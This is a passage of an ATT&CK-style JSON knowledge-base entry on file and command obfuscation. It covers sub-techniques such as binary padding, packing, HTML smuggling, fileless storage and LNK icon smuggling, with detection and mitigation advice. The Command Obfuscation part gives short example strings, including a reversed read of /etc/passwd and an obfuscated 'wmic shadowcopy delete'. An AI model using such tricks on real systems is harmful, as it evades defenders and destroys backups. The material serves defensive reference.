Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. <a href=\"https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity PowerDuke November 2016)</a> Adversaries may also use compressed or archived scripts, such as JavaScript. \n\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. <a href=\"https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux/Cdorked.A We Live Security Analysis)</a> Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. <a href=\"https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Carbon Black Obfuscation Sept 2016)</a>\n\nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. <a href=\"https://web.archive.org/web/20170923102302/https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Obfuscation June 2017)</a> <a href=\"https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Revoke-Obfuscation July 2017)</a> <a href=\"https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PaloAlto EncodedCommand March 2017)</a>","detection":"Detection of file obfuscation is difficult unless artifacts are left behind by the obfuscation process that are uniquely detectable with a signature. If detection of the obfuscation itself is not possible, it may be possible to detect the malicious activity that caused the obfuscated file (for example, the method that was used to write, read, or modify the file on the file system). \n\nFlag and analyze commands containing indicators of obfuscation and known suspicious syntax such as uninterpreted escape characters like '''^''' and '''\"'''. Windows' Sysmon and Event ID 4688 displays command-line arguments for processes. Deobfuscation tools can be used to detect these indicators in files/payloads. <a href=\"https://github.com/danielbohannon/Revoke-Obfuscation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Revoke-Obfuscation)</a> <a href=\"https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Revoke-Obfuscation July 2017)</a> <a href=\"https://github.com/itsreallynick/office-crackros\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub Office-Crackros Aug 2016)</a> \n\nObfuscation used in payloads for Initial Access can be detected at the network. Use network intrusion detection systems and email gateway filtering to identify compressed and encrypted attachments and scripts. Some email attachment detonation systems can open compressed and encrypted attachments. Payloads delivered over an encrypted connection from a website require encrypted network traffic inspection. \n\nThe first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["WMI: WMI Creation","Script: Script Execution","File: File Creation","Module: Module Load","Application Log: Application Log Content","Command: Command Execution","File: File Metadata","Process: OS API Execution","Windows Registry: Windows Registry Key Creation","Process: Process Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Ensure that a finite amount of ingress points to a software deployment system exist with restricted access for those required to allow and enable newly deployed software."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10+, enable Attack Surface Reduction (ASR) rules to prevent execution of potentially obfuscated payloads. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"},{"id":"M1047","name":"Audit","description":"Consider periodic review of common fileless storage locations (such as the Registry or WMI repository) to potentially identify abnormal and malicious data."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically detect and quarantine suspicious files. Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10+ to analyze commands after being processed/interpreted. <a href=\"https://cloudblogs.microsoft.com/microsoftsecure/2015/06/09/windows-10-to-offer-application-developers-new-malware-defenses/?source=mmpc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AMSI June 2015)</a>"}],"subTechniques":[{"id":"T1027.001","name":"Binary Padding","description":"Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. \n\nBinary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. <a href=\"https://www.welivesecurity.com/2018/03/13/oceanlotus-ships-new-backdoor/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET OceanLotus)</a> The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. <a href=\"https://securelist.com/old-malware-tricks-to-bypass-detection-in-the-age-of-big-data/78010/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Securelist Malware Tricks April 2017)</a> Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed. <a href=\"https://www.virustotal.com/en/faq/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: VirusTotal FAQ)</a>","detection":"Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool.  When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Metadata"],"mitigations":[]},{"id":"T1027.002","name":"Software Packing","description":"Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2018/01/WP-FinFisher.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET FinFisher Jan 2018)</a> \n\nUtilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses. <a href=\"https://github.com/dhondta/awesome-executable-packing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Awesome Executable Packing)</a>","detection":"Use file scanning to look for known software packers or artifacts of packing techniques. Packing is not a definitive indicator of malicious activity, because legitimate software may use packing techniques to reduce binary size or to protect proprietary code.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Metadata"],"mitigations":[{"id":"M1049","name":"Antivirus/Antimalware","description":"Employ heuristic-based malware detection. Ensure updated virus definitions and create custom signatures for observed malware."}]},{"id":"T1027.003","name":"Steganography","description":"Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\nDuqu was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server. <a href=\"https://en.wikipedia.org/wiki/Duqu\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Duqu)</a> \n\nBy the end of 2017, a threat group used <code>Invoke-PSImage</code> to hide PowerShell commands in an image file (.png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. <a href=\"https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)</a>","detection":"Detection of steganography is difficult unless artifacts are left behind by the obfuscation process that are detectable with a known signature. Look for strings or other signatures left in system artifacts related to decoding steganography.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Metadata"],"mitigations":[]},{"id":"T1027.004","name":"Compile After Delivery","description":"Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as ilasm.exe <a href=\"https://www.attackiq.com/2023/03/16/hiding-in-plain-sight/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ATTACK IQ)</a>, csc.exe, or GCC/MinGW. <a href=\"https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ClearSky MuddyWater Nov 2018)</a>\n\nSource code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a Phishing. Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework. <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/windows-app-runs-on-mac-downloads-info-stealer-and-adware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro WindowsAppMac)</a>","detection":"Monitor the execution file paths and command-line arguments for common compilers, such as csc.exe and GCC/MinGW, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior. The compilation of payloads may also generate file creation and/or file write events. Look for non-native binary formats and cross-platform compiler and execution frameworks like Mono and determine if they have a legitimate purpose on the system. <a href=\"https://blog.trendmicro.com/trendlabs-security-intelligence/windows-app-runs-on-mac-downloads-info-stealer-and-adware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrendMicro WindowsAppMac)</a> Typically these should only be used in specific and limited cases, like for software development.","platforms":["Linux","macOS","Windows"],"dataSources":["Command: Command Execution","File: File Creation","Process: Process Creation","File: File Metadata"],"mitigations":[]},{"id":"T1027.005","name":"Indicator Removal from Tools","description":"Adversaries may remove indicators from tools if they believe their malicious tool was detected, quarantined, or otherwise curtailed. They can modify the tool by removing the indicator and using the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may modify the file to explicitly avoid that signature, and then re-use the malware.","detection":"The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.","platforms":["Linux","macOS","Windows"],"dataSources":["Application Log: Application Log Content"],"mitigations":[]},{"id":"T1027.006","name":"HTML Smuggling","description":"Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads. <a href=\"https://www.menlosecurity.com/blog/new-attack-alert-duri\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: HTML Smuggling Menlo Security 2020)</a> <a href=\"https://outflank.nl/blog/2018/08/14/html-smuggling-explained/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Outlflank HTML Smuggling 2018)</a>\n\nAdversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. Deobfuscate/Decode Files or Information), potentially bypassing content filters.\n\nFor example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>. <a href=\"https://www.menlosecurity.com/blog/new-attack-alert-duri\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: HTML Smuggling Menlo Security 2020)</a> <a href=\"https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MSTIC NOBELIUM May 2021)</a> <a href=\"https://outflank.nl/blog/2018/08/14/html-smuggling-explained/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Outlflank HTML Smuggling 2018)</a> <a href=\"https://www.nccgroup.com/us/research-blog/smuggling-hta-files-in-internet-exploreredge/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: nccgroup Smuggling HTA 2017)</a>","detection":"Detection of HTML Smuggling is difficult as HTML5 and JavaScript attributes are used by legitimate services and applications. HTML Smuggling can be performed in many ways via JavaScript, developing rules for the different variants, with a combination of different encoding and/or encryption schemes, may be very challenging. <a href=\"https://outflank.nl/blog/2018/08/14/html-smuggling-explained/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Outlflank HTML Smuggling 2018)</a> Detecting specific JavaScript and/or HTML5 attribute strings such as <code>Blob</code>, <code>msSaveOrOpenBlob</code>, and/or <code>download</code> may be a good indicator of HTML Smuggling. These strings may also be used by legitimate services therefore it is possible to raise false positives.\n\nConsider monitoring files downloaded from the Internet, possibly by HTML Smuggling, for suspicious activities. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Creation"],"mitigations":[{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Use Browser Extensions or Built-in Security Tools that:\n\n- Monitor JavaScript API calls such as <code>Blob</code>, <code>URL.createObjectURL,</code> and <code>msSaveOrOpenBlob</code>\n- Intercept and analyze HTML5 <code>download</code> attributes for suspicious payload generation\n- Alert or block behaviors that match known HTML smuggling patterns (e.g., blob-to-disk payload construction)\n\nApply Content Security Policy (CSP) headers to:\n\n- Restrict inline JavaScript and dynamic script generation\n- Disallow downloads from unauthorized sources or blob URIs\n- Prevent cross-origin resource sharing (CORS) abuse commonly used in smuggling chains\n\nEnable or enforce enterprise browser security controls, such as:\n\n- Endpoint's Network Protection and Attack Surface Reduction (ASR) rules, which can block Office and browser processes from creating child processes or writing to disk in suspicious ways\n- Google Chrome Enterprise Policies, which can control file download behavior, restrict extensions, and isolate risky browsing environments\n\nDeploy browser sandboxing solutions that can isolate JavaScript execution environments and enforce behavioral policy restrictions"}]},{"id":"T1027.007","name":"Dynamic API Resolution","description":"Adversaries may obfuscate then dynamically resolve API functions called by their malware in order to conceal malicious functionalities and impair defensive analysis. Malware commonly uses various Native API functions provided by the OS to perform various tasks such as those involving processes, files, and other system artifacts.\n\nAPI functions called by malware may leave static artifacts such as strings in payload files. Defensive analysts may also uncover which functions a binary file may execute via an import address table (IAT) or other structures that help dynamically link calling code to the shared modules that provide functions. <a href=\"https://www.huntress.com/blog/hackers-no-hashing-randomizing-api-hashes-to-evade-cobalt-strike-shellcode-detection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Huntress API Hash)</a> <a href=\"https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: IRED API Hashing)</a>\n\nTo avoid static or other defensive analysis, adversaries may use dynamic API resolution to conceal malware characteristics and functionalities. Similar to Software Packing, dynamic API resolution may change file signatures and obfuscate malicious API function calls until they are resolved and invoked during runtime.\n\nVarious methods may be used to obfuscate malware calls to API functions. For example, hashes of function names are commonly stored in malware in lieu of literal strings. Malware can use these hashes (or other identifiers) to manually reproduce the linking and loading process using functions such as <code>GetProcAddress()</code> and <code>LoadLibrary()</code>. These hashes/identifiers can also be further obfuscated using encryption or other string manipulation tricks (requiring various forms of Deobfuscate/Decode Files or Information during execution). <a href=\"https://www.blackhat.com/docs/us-15/materials/us-15-Choi-API-Deobfuscator-Resolving-Obfuscated-API-Functions-In-Modern-Packers.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat API Packers)</a> <a href=\"https://dr4k0nia.github.io/dotnet/coding/2022/08/10/HInvoke-and-avoiding-PInvoke.html?s=03\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Drakonia HInvoke)</a> <a href=\"https://www.huntress.com/blog/hackers-no-hashing-randomizing-api-hashes-to-evade-cobalt-strike-shellcode-detection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Huntress API Hash)</a>","detection":"","platforms":["Windows"],"dataSources":["Module: Module Load","File: File Metadata","Process: OS API Execution"],"mitigations":[]},{"id":"T1027.008","name":"Stripped Payloads","description":"Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s <code>linker</code> when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads. <a href=\"https://www.mandiant.com/resources/blog/golang-internals-symbol-recovery\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant golang stripped binaries explanation)</a> <a href=\"https://www.intezer.com/blog/malware-analysis/executable-linkable-format-101-part-2-symbols/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: intezer stripped binaries elf files 2018)</a>\n\nAdversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of AppleScript, to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads. <a href=\"https://www.sentinelone.com/labs/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SentinelLabs reversing run-only applescripts 2021)</a>","detection":"","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["File: File Metadata"],"mitigations":[]},{"id":"T1027.009","name":"Embedded Payloads","description":"Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to Subvert Trust Controls by not impacting execution controls such as digital signatures and notarization tickets. <a href=\"https://www.sentinelone.com/labs/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sentinel Labs)</a> \n\nAdversaries may embed payloads in various file formats to hide payloads. <a href=\"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/c41e062d-f764-4f13-bd4f-ea812ab9a4d1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Learn)</a> This is similar to Steganography, though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats. <a href=\"https://github.com/peewpw/Invoke-PSImage\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub PSImage)</a> \n\nFor example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary. <a href=\"https://securelist.com/my-name-is-dtrack/93338/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Securelist Dtrack2)</a> Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format. <a href=\"https://www.sentinelone.com/labs/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SentinelLabs reversing run-only applescripts 2021)</a> \n\nEmbedded content may also be used as Process Injection payloads used to infect benign system processes. <a href=\"https://www.trendmicro.com/en_us/research/20/e/netwalker-fileless-ransomware-injected-via-reflective-loading.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro)</a> These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network. <a href=\"https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malware Analysis Report ComRAT)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Creation","File: File Metadata"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent execution of potentially obfuscated scripts. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"},{"id":"M1049","name":"Antivirus/Antimalware","description":"Anti-virus can be used to automatically detect and quarantine suspicious files."}]},{"id":"T1027.010","name":"Command Obfuscation","description":"Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., Phishing and Drive-by Compromise) or interactively via Command and Scripting Interpreter. <a href=\"https://www.akamai.com/blog/security/catch-me-if-you-can-javascript-obfuscation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Akamai JS)</a> <a href=\"https://bromiley.medium.com/malware-monday-vbscript-and-vbe-files-292252c1a16\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malware Monday VBE)</a>\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  <code>^</code>, <code>+</code>. <code>$</code>, and <code>%</code>) to make commands difficult to analyze while maintaining the same intended functionality. <a href=\"https://redcanary.com/threat-detection-report/techniques/powershell/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RC PowerShell)</a> Many languages support built-in obfuscation in the form of base64 or URL encoding. <a href=\"https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1#-encodedcommand-base64encodedcommand\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PowerShellB64)</a> Adversaries may also manually implement command obfuscation via string splitting (<code>“Wor”+“d.Application”</code>), order and casing of characters (<code>rev &lt;&lt;&lt;'dwssap/cte/ tac'</code>), globing (<code>mkdir -p '/tmp/:&amp;$NiA'</code>), as well as various tricks involving passing strings through tokens/environment variables/input streams. <a href=\"https://bashfuscator.readthedocs.io/en/latest/Mutators/command_obfuscators/index.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bashfuscator Command Obfuscators)</a> <a href=\"https://web.archive.org/web/20170923102302/https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Obfuscation June 2017)</a>\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (<code>C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete</code>). <a href=\"https://x.com/rfackroyd/status/1639136000755765254\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter Richard WMIC)</a>\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands. <a href=\"https://github.com/danielbohannon/Invoke-DOSfuscation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Invoke-DOSfuscation)</a> <a href=\"https://github.com/danielbohannon/Invoke-Obfuscation\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Invoke-Obfuscation)</a>","detection":"","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Metadata","Script: Script Execution","Command: Command Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10+, enable Attack Surface Reduction (ASR) rules to block execution of potentially obfuscated scripts. <a href=\"https://learn.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference#block-execution-of-potentially-obfuscated-scripts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft ASR Obfuscation)</a>"},{"id":"M1049","name":"Antivirus/Antimalware","description":"Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10+ to analyze commands after being processed/interpreted."}]},{"id":"T1027.011","name":"Fileless Storage","description":"Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository. <a href=\"https://learn.microsoft.com/microsoft-365/security/intelligence/fileless-threats\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Fileless)</a> <a href=\"https://securelist.com/a-new-secret-stash-for-fileless-malware/106393/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SecureList Fileless)</a> Shared memory directories on Linux systems (<code>/dev/shm</code>, <code>/run/shm</code>, <code>/var/run</code>, and <code>/var/lock</code>) and volatile directories on Network Devices (<code>/tmp</code> and <code>/volatile</code>) may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk. <a href=\"https://www.elastic.co/guide/en/security/7.17/prebuilt-rule-7-16-3-binary-executed-from-shared-memory-directory.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Binary Executed from Shared Memory Directory)</a> <a href=\"https://www.akamai.com/blog/security-research/fritzfrog-botnet-new-capabilities-log4shell\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Akami Frog4Shell 2024)</a> <a href=\"https://www.aquasec.com/blog/muhstik-malware-targets-message-queuing-services-applications/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Aquasec Muhstik Malware 2024)</a> <a href=\"https://www.bitsight.com/blog/7777-botnet-insights-multi-target-botnet\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bitsight 7777 Botnet)</a> <a href=\"https://www.cisco.com/c/en/us/td/docs/switches/datacenter/nexus9000/sw/7-x/fundamentals/configuration/guide/b_Cisco_Nexus_9000_Series_NX-OS_Fundamentals_Configuration_Guide_7x/b_Cisco_Nexus_9000_Series_NX-OS_Fundamentals_Configuration_Guide_7x_chapter_01000.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISCO Nexus 900 Config)</a>.\n\nSimilar to fileless in-memory behaviors such as Reflective Code Loading and Process Injection, fileless data storage may remain undetected by antivirus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux. <a href=\"https://sysdig.com/blog/containers-read-only-fileless-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sysdig Fileless Malware 23022)</a>\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of Persistence) and collected data not yet exfiltrated from the victim (e.g., Local Data Staging). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored. \n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., <code>%SystemRoot%\\System32\\Wbem\\Repository</code>) or Registry (e.g., <code>%SystemRoot%\\System32\\Config</code>) physical files. <a href=\"https://learn.microsoft.com/microsoft-365/security/intelligence/fileless-threats\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Fileless)</a>","detection":"","platforms":["Linux","Windows"],"dataSources":["Windows Registry: Windows Registry Key Creation","WMI: WMI Creation","Process: Process Creation"],"mitigations":[{"id":"M1047","name":"Audit","description":"Consider periodic review of common fileless storage locations (such as the Registry or WMI repository) to potentially identify abnormal and malicious data."}]},{"id":"T1027.012","name":"LNK Icon Smuggling","description":"Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the <code>IconEnvironmentDataBlock</code>) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. \n\nAdversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., Malicious File), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by Command and Scripting Interpreter/System Binary Proxy Execution arguments within the target path field of the LNK. <a href=\"https://unprotect.it/technique/shortcut-hiding/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unprotect Shortcut)</a> <a href=\"https://www.uperesia.com/booby-trapped-shortcut\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Booby Trap Shortcut 2017)</a>\n\nLNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.","detection":"","platforms":["Windows"],"dataSources":["File: File Metadata","File: File Creation"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent execution of potentially obfuscated scripts or payloads."},{"id":"M1049","name":"Antivirus/Antimalware","description":"Use signatures or heuristics to detect malicious LNK and subsequently downloaded files."}]},{"id":"T1027.013","name":"Encrypted/Encoded File","description":"Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many 